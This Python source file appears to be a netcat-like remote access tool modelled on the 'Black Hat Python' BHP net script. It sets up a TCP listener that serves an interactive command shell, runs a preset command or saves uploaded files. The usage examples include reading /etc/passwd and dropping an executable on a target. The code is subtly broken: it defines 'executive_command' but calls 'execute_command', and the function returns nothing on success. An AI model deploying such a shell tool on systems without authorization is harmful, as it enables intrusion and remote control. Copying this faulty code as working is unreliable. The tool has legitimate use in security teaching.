import argparse   # Module for parsing command-line arguments (e.g., -l, -t).
import socket     # Module for network connections (TCP/IP).
import shlex      # Module for secure shell command splitting.
import subprocess # Module for executing system commands.
import sys        # Module for system-specific parameters and functions (e.g., exit).
import textwrap   # Module for formatting text, used for the help message.
import threading  # Module for concurrent execution (handling multiple clients).

# Global variables to store program state based on user input.
# They will be set in the main() function.

listen = False
command = False
execute = ''
target = ''
upload = ''
port = 0

def executive_command(cmd):
    """
    Executes a shell command on the local system and returns the output.
    Uses shlex.split for secure argument handling (prevents simple injection).
    """
    cmd = cmd.strip()
    if not cmd:
        return
    
    # Use shlex.split to safely prepare the command for execution.
    try:
        cmd_list = shlex.split(cmd)
        
        # Execute the command, capturing both STDOUT and STDERR.
        output = subprocess.check_output(cmd_list,
                                         stderr=subprocess.STDOUT)
    except Exception as e:
            # If execution fails (e.g., command not found), return the error message.
            output = str(e).encode()
            return output
def client_handler(client_socket):
    """
    Handles the server-side logic for a single connected client.
    This function is run in a separate thread.
    """
    global upload
    global execute
    global command

    # --- UPLOAD MODE (-u) ---
    if upload:
        file_buffer = b''
        # Continuously receive data until the connection is closed.
        while True:
            data = client_socket.recv(4096)
            if not data:
                break
            file_buffer += data
        
        # Write the received buffer to the specified file path.
        try:
            with open(upload, 'wb') as f:
                f.write(file_buffer)
            client_socket.send(f"Successfully saved file to {upload}".encode())
        except Exception as e:
            client_socket.send(f"Failed to save file: {e}".encode())

    # --- EXECUTE MODE (-e) ---
    if execute:
        # Execute the predefined command and send the output back.
        output = execute_command(execute)
        client_socket.send(output)

    # --- COMMAND SHELL MODE (-c) ---
    if command:
        # Enter an infinite loop to provide an interactive shell.
        while True:
            try:
                # Send the prompt to the client.
                client_socket.send(b'<BHP:#> ')
                
                # Receive the full command from the client (until newline).
                cmd_buffer = b''
                while b'\n' not in cmd_buffer:
                    cmd_buffer += client_socket.recv(64)

                # Execute the received command and get the response.
                response = execute_command(cmd_buffer.decode())

                # Send the command result back to the client.
                if response:
                    client_socket.send(response)

            except Exception as e:
                # Log the error and close the connection upon failure.
                print(f'Error in command shell: {e}')
                client_socket.close()
                break

def server_loop():
    """
    The main server function. Creates the listening socket and delegates
    client handling to threads.
    """
    global target
    global port

    if not target:
        # Listen on all interfaces if no target is specified.
        target = '0.0.0.0' 

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        server.bind((target, port))
        server.listen(5) # Start listening (max 5 queued connections).
        print(f"[*] Listening on {target}:{port}")
    except Exception as e:
        # Handle bind errors (e.g., port already in use).
        print(f"Error while listening on {target}:{port}: {e}")
        sys.exit(1)

    while True:
        # Wait for and accept an incoming connection.
        client_socket, addr = server.accept()
        print(f"[*] Accepting connection from {addr[0]}:{addr[1]}")
        
        # Start a new thread to handle the client (client_handler).
        client_thread = threading.Thread(target=client_handler,
                                         args=(client_socket,))
        client_thread.start()
def client_sender(buffer):
    """
    The main client function. Connects to the target, sends initial data,
    and handles the interactive command loop.
    """
    global target
    global port
    
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        client.connect((target, port))
        
        # Send the initial buffer (e.g., contents redirected from STDIN).
        if buffer:
            client.send(buffer)

        # Interactive loop to send and receive data.
        while True:
            # Receive response from the server.
            recv_len = 1
            response = b''
            # Loop to ensure all data from the server is received.
            while recv_len:
                data = client.recv(4096)
                recv_len = len(data)
                response += data
                
                # Assume end of response if less than 4096 bytes were received.
                if recv_len < 4096:
                    break
            
            # Print the server's response (decoded to string).
            print(response.decode(), end='')
            
            # Get next input from the user (for the command shell).
            buffer = input()
            buffer += '\n'
            # Send the user's command to the server.
            client.send(buffer.encode())

    except Exception as e:
        # Handle connection errors (e.g., connection refused, server went down).
        print(f"Client error: {e}")
        client.close()
        sys.exit(1)       
        
def main():
    global listen
    global port
    global execute
    global command
    global upload
    global target

    # Display help message if no arguments are provided.
    if not len(sys.argv[1:]):
        print(textwrap.dedent("""\
        Network Tool (Netcat-like)

        Usage: bhnet.py -t target_host -p port
        -l --listen                  - set up a listener on [host]:[port]
        -e --execute=file_to_run     - execute file upon receiving a connection
        -c --command                 - initialize a command shell
        -u --upload=destination      - upload file upon receiving a connection

        Examples:
        bhnet.py -t 192.168.1.10 -p 9999 -l -c
        bhnet.py -t 192.168.1.10 -p 9999 -l -u=c:\\target.exe
        bhnet.py -t 192.168.1.10 -p 9999 -e="cat /etc/passwd"
        echo 'ABCDEFG' | ./bhnet.py -t 192.168.1.10 -p 80
        """))
        sys.exit(0)

    # 1. Argument Parsing (using argparse)
    parser = argparse.ArgumentParser(description="Multi-purpose Netcat-like network tool.")
    parser.add_argument('-l', '--listen', action='store_true', help='Enables listener mode.')
    parser.add_argument('-e', '--execute', type=str, help='File to execute upon connection.')
    parser.add_argument('-c', '--command', action='store_true', help='Initializes a command shell.')
    parser.add_argument('-u', '--upload', type=str, help='Destination path for file upload.')
    parser.add_argument('-t', '--target', type=str, default='', help='Target host (IP or domain).')
    parser.add_argument('-p', '--port', type=int, default=0, help='Target port.')

    args = parser.parse_args()

    # 2. Assign values from parsed arguments to global variables
    listen = args.listen
    execute = args.execute
    command = args.command
    upload = args.upload
    target = args.target
    port = args.port

    # 3. Main Logic: Decide whether to run as a client or a server
    
    # Client Mode: Not listening AND target and port are set.
    if not listen and target and port > 0:
        # Read buffer from STDIN (standard input)
        buffer = sys.stdin.read().encode()
        client_sender(buffer)
        
    # Server Mode: Listening is enabled.
    elif listen:
        server_loop()
        
    # Invalid Usage:
    else:
        print("Invalid usage. Use -h for help.")
        sys.exit(1)


if __name__ == '__main__':
    main()       
